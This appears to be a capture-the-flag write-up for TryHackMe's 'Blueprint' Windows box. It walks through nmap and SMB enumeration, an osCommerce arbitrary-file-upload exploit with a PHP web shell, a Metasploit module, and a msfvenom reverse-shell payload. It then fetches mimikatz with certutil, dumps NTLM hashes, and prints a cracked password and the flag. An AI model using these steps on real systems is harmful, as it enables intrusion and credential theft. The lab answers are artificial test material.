> Blueprint | Windows

**export IP=10.10.1.85**

# Nmap

nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
80/tcp    open     http          syn-ack     Microsoft IIS httpd 7.5
135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
443/tcp   open     ssl/http      syn-ack     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
445/tcp   open     microsoft-ds  syn-ack     Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
1131/tcp  filtered caspssl       no-response
3306/tcp  open     mysql         syn-ack     MariaDB (unauthorized)
5120/tcp  filtered barracuda-bbs no-response
8080/tcp  open     http          syn-ack     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
49152/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49153/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49154/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49158/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49159/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49160/tcp open     msrpc         syn-ack     Microsoft Windows RPC
```

# SMB Anonymous Login

smbclient -L $IP

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
	Windows         Disk      
SMB1 disabled -- no workgroup available
```

In port `8080` we found oscommerce website and on directory bruteforcing we found an `install` page. It allows us to install oscommerce and I created and set the credentials as `admin:admin`

# Exploit

searchsploit oscommerce 2.3.4

```
osCommerce 2.3.4.1 - Arbitrary File Upload    | php/webapps/43191.py
```

## Note: This exploit requires a privileged account and a php shell

# shell.php

```
<?php
passthru($_GET('cmd'));
?>
```

And executing the exploit

python 43191.py -u http://$IP:8080/oscommerce-2.3.4 --auth admin:admin -f shell.php

```
[+] Authentication successful
[+] Successfully prepared the exploit and created a new newsletter with nID 1
[+] Successfully locked the newsletter. Now attempting to upload..
[*] Now trying to verify that the file shell.php uploaded..
[+] Got a HTTP 200 Reply for the uploaded file!
[+] The uploaded file should now be available at http://10.10.1.85:8080/oscommerce-2.3.4/catalog/admin/shell.php
```

Accessing `http://10.10.1.85:8080/oscommerce-2.3.4/catalog/admin/shell.php?cmd=whoami` gives us `nt authority\system`

We have to get a stacle shell.

# Metasploit

use multi/http/oscommerce_installer_unauth_code_exec
set options
set URI /oscommerce-2.3.4/catalog/install
run

## Gives us a meterpreter session!

# Generating payload

msfvenom -p windows/reverse_tcp LHOST=tun0 LPORT=1234 -f exe > shell.exe

And upload `shell.exe` in the meterpreter session

Set up a netcat listener to catch it. On getting the reverse shell we find that the system is X86 architecture

# Mimikatz

Start a python server in local machine and upload it in the box using certutil

certutil.exe -urlcache -f http://$IP/mimikatz.exe mimikatz.exe

And running mimkatz.exe we are in!

lsadump::sam

```
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bf999828446a1c1209ddde4c450
```

# Lab user NTLM decrypted

30e87bf999828446a1c1209ddde4c450 => Crackstation

`googleplus`

And navigating to the Desktop we get root.txt.txt

```
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```